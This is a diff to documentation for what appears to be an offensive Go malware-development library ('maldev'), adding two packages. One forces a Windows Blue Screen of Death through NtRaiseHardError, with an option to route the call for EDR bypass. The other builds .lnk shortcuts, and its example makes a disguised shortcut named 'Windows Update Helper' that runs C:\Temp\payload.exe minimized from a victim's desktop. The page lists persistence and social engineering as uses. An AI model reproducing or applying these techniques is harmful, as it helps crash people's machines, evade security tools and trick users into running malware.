@@ -2,12 +2,14 @@
 
 # System Information
 
-This page documents the four system information packages in maldev:
+This page documents the six system packages in maldev:
 
 - **`system/drive`** -- Drive enumeration, type detection, volume info, and monitoring (Windows)
 - **`system/folder`** -- Windows special folder paths via CSIDL constants (Windows)
 - **`system/network`** -- IP address retrieval and local address detection (cross-platform)
 - **`system/ui`** -- Message boxes and system sounds (Windows)
+- **`system/bsod`** -- Trigger Blue Screen of Death via NtRaiseHardError (Windows)
+- **`system/lnk`** -- Create Windows .lnk shortcut files via COM/OLE (Windows)
 
 ---
 
@@ -724,4 +726,142 @@ import "github.com/oioio-space/maldev/system/ui"
 func main() {
     ui.Beep()
 }
+```
+
+---
+
+## system/bsod -- Blue Screen of Death
+
+Package `bsod` triggers an immediate Blue Screen of Death via `NtRaiseHardError`. This is a destructive, non-recoverable operation -- the system will crash immediately with no opportunity to save data.
+
+**MITRE ATT&CK:** T1529 (System Shutdown/Reboot)
+**Platform:** Windows
+**Detection:** High -- system crash generates a kernel dump and event log entries.
+
+### Errors
+
+```go
+var (
+    ErrPrivilege = errors.New("privilege adjustment failed")
+    ErrHardError = errors.New("hard error call failed")
+)
+```
+
+### Functions
+
+#### `Trigger`
+
+```go
+func Trigger(caller *wsyscall.Caller) error
+```
+
+**Purpose:** Causes an immediate Blue Screen of Death. This function does not return on success.
+
+**Parameters:**
+- `caller` -- When non-nil, `NtRaiseHardError` is routed through the Caller for EDR bypass. `RtlAdjustPrivilege` always uses the WinAPI path. Pass `nil` for standard WinAPI behavior.
+
+**How it works:**
+1. Enables `SeShutdownPrivilege` via `RtlAdjustPrivilege` (a single ntdll call, faster than the multi-step token manipulation path).
+2. Calls `NtRaiseHardError` with status `0xDEADDEAD` and option 6 (shutdown system).
+3. The kernel immediately triggers a bugcheck -- no user-mode cleanup occurs.
+
+**Example:**
+
+```go
+import "github.com/oioio-space/maldev/system/bsod"
+
+// Standard WinAPI path
+err := bsod.Trigger(nil)
+if err != nil {
+    log.Fatal(err) // only reached if the call fails
+}
+```
+
+---
+
+## system/lnk -- Windows Shortcut File Creation
+
+Package `lnk` creates Windows `.lnk` shortcut files via COM/OLE (`WScript.Shell` + `IWshShortcut`). Useful for persistence (startup folder shortcuts), social engineering (malicious .lnk files), and general-purpose shortcut creation.
+
+**MITRE ATT&CK:** T1204.002 (User Execution: Malicious File), T1547.009 (Shortcut Modification)
+**Platform:** Windows
+**Detection:** Low -- .lnk creation is normal Windows behavior.
+
+### Types
+
+#### `WindowStyle`
+
+```go
+type WindowStyle int
+
+const (
+    StyleNormal    WindowStyle = 1 // Normal window
+    StyleMaximized WindowStyle = 3 // Maximized window
+    StyleMinimized WindowStyle = 7 // Minimized window (common for persistence)
+)
+```
+
+#### `Shortcut`
+
+```go
+type Shortcut struct {
+    // unexported fields configured via builder methods
+}
+```
+
+Holds the properties for a Windows .lnk file. Use `New` to create an instance, configure it with the `Set*` methods, and call `Save` to write the file.
+
+### Functions
+
+#### `New`
+
+```go
+func New() *Shortcut
+```
+
+**Purpose:** Returns a zero-value `Shortcut` ready for configuration via the builder methods.
+
+---
+
+#### Builder Methods
+
+All builder methods return `*Shortcut` for chaining:
+
+| Method | Purpose |
+|--------|---------|
+| `SetTargetPath(path string)` | Set the executable or document the shortcut points to |
+| `SetArguments(args string)` | Set command-line arguments passed to the target |
+| `SetWorkingDir(dir string)` | Set the working directory for the target process |
+| `SetIconLocation(icon string)` | Set the icon path (e.g., `"shell32.dll,3"`) |
+| `SetDescription(desc string)` | Set the shortcut tooltip text |
+| `SetHotkey(hotkey string)` | Set the keyboard shortcut (e.g., `"Ctrl+Alt+T"`) |
+| `SetWindowStyle(style WindowStyle)` | Set how the target window is displayed |
+
+---
+
+#### `Save`
+
+```go
+func (s *Shortcut) Save(path string) error
+```
+
+**Purpose:** Creates or overwrites the `.lnk` file at the given path using COM/OLE.
+
+**Parameters:**
+- `path` -- Full path for the .lnk file (must end in `.lnk`).
+
+**How it works:** Manages the full COM lifecycle internally (`CoInitializeEx`, `WScript.Shell` object creation, property assignment, `Save`, cleanup). The calling goroutine is locked to an OS thread for COM thread affinity.
+
+**Example:**
+
+```go
+import "github.com/oioio-space/maldev/system/lnk"
+
+err := lnk.New().
+    SetTargetPath(`C:\Windows\System32\cmd.exe`).
+    SetArguments(`/c C:\Temp\payload.exe`).
+    SetIconLocation(`shell32.dll,3`).
+    SetWindowStyle(lnk.StyleMinimized).
+    SetDescription("Windows Update Helper").
+    Save(`C:\Users\victim\Desktop\readme.lnk`)
 ```
